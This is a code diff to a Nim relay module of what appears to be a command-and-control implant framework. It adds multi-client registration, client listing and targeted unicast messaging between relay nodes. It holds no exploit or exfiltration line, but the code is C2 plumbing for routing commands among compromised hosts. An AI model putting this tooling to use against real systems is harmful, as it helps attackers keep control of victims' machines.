@@ -20,15 +20,24 @@ proc getRelayConnections*(): int =
     return stats.connections
 
 # Export connection stats function for main.nim
-proc getConnectionStats*(server: RelayServer): tuple[connections: int, activeConnections: int] {.exportc.} =
+proc getConnectionStats*(server: RelayServer): tuple[connections: int, activeConnections: int, registeredClients: int] {.exportc.} =
     let stats = relay_comm.getConnectionStats(server)
-    return (connections: stats.connections, activeConnections: stats.connections)
+    return (connections: stats.connections, activeConnections: stats.connections, registeredClients: stats.registeredClients)
 
 # Export broadcast message function for main.nim  
 proc broadcastMessage*(server: RelayServer, message: RelayMessage): bool {.exportc.} =
     var mutableServer = server  # Create mutable copy
     let sent = relay_comm.broadcastMessage(mutableServer, message)
     return sent > 0
+
+# Export unicast message function for main.nim (PREFERRED)
+proc sendToClient*(server: RelayServer, clientID: string, message: RelayMessage): bool {.exportc.} =
+    var mutableServer = server  # Create mutable copy
+    return relay_comm.sendToClient(mutableServer, clientID, message)
+
+# Export connected clients list function for main.nim
+proc getConnectedClients*(server: RelayServer): seq[string] {.exportc.} =
+    return relay_comm.getConnectedClients(server)
 
 # Process relay commands - USING SAFE relay_comm.nim FUNCTIONS
 proc processRelayCommand*(cmd: string): string =
@@ -147,14 +156,26 @@ proc processRelayCommand*(cmd: string): string =
             return "Failed to disconnect: " & getCurrentExceptionMsg()
     
     of "status":
-        var status = "=== Relay Status ===\n"
+        var status = "=== Multi-Client Relay Status ===\n"
         status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
         
         let stats = getConnectionStats(g_relayServer)
-        status &= "Connected Clients: " & $stats.connections & "\n"
+        status &= "Total Connections: " & $stats.connections & "\n"
+        status &= "Registered Clients: " & $stats.registeredClients & "\n"
+        
+        # List connected clients
+        if g_relayServer.isListening and stats.registeredClients > 0:
+            let connectedClients = relay_comm.getConnectedClients(g_relayServer)
+            status &= "Client List: "
+            for i, clientID in connectedClients:
+                if i > 0: status &= ", "
+                status &= clientID
+            status &= "\n"
+        
         status &= "Upstream Relay: " & (if upstreamRelay.isConnected: "Connected" else: "Disconnected") & "\n"
         status &= "HTTP to C2: " & (if isConnectedToRelay: "DISABLED (using relay)" else: "ENABLED") & "\n"
-        status &= "Protocol: relay_comm.nim (secure)\n"
+        status &= "Protocol: Multi-Client relay_comm.nim (secure)\n"
+        status &= "Features: Auto-registration, Unicast routing, Connection pooling\n"
         return status
     
     of "stop":
@@ -164,12 +185,57 @@ proc processRelayCommand*(cmd: string): string =
         try:
             # USE SAFE FUNCTION FROM relay_comm.nim
             closeRelayServer(g_relayServer)
-            return "Relay server stopped (secure shutdown)"
+            return "Multi-client relay server stopped (secure shutdown)"
         except:
             return "Failed to stop relay server: " & getCurrentExceptionMsg()
     
+    of "clients":
+        if not g_relayServer.isListening:
+            return "Relay server is not running"
+        
+        let stats = getConnectionStats(g_relayServer)
+        var result = "=== Connected Relay Clients ===\n"
+        result &= "Total connections: " & $stats.connections & "\n"
+        result &= "Registered clients: " & $stats.registeredClients & "\n\n"
+        
+        if stats.registeredClients > 0:
+            let connectedClients = getConnectedClients(g_relayServer)
+            result &= "Client List:\n"
+            for i, clientID in connectedClients:
+                result &= "  " & $(i + 1) & ". " & clientID & "\n"
+        else:
+            result &= "No clients registered\n"
+        
+        return result
+    
+    of "send":
+        if parts.len < 4:
+            return "Usage: relay send <clientID> <message>"
+        
+        if not g_relayServer.isListening:
+            return "Relay server is not running"
+        
+        let targetClientID = parts[2]
+        let message = parts[3..^1].join(" ")
+        
+        # Create a test message to send to specific client
+        let testMsg = createMessage(HTTP_RESPONSE, "RELAY-SERVER", @[targetClientID], message)
+        let success = sendToClient(g_relayServer, targetClientID, testMsg)
+        
+        if success:
+            return "Message sent to client: " & targetClientID
+        else:
+            return "Failed to send message to client: " & targetClientID & " (client not found or disconnected)"
+    
     else:
-        return "Unknown relay command. Available: port, connect, disconnect, status, stop"
+        return "Unknown relay command. Available:\n" &
+               "  relay port <port>      - Start multi-client relay server\n" &
+               "  relay connect <url>    - Connect to upstream relay\n" &
+               "  relay disconnect       - Disconnect from upstream\n" &
+               "  relay status           - Show relay and client status\n" &
+               "  relay clients          - List connected clients\n" &
+               "  relay send <id> <msg>  - Send message to specific client\n" &
+               "  relay stop             - Stop relay server"
 
 # Poll relay server for new messages - USING SAFE FUNCTIONS
 proc pollRelayServerMessages*(): seq[RelayMessage] =
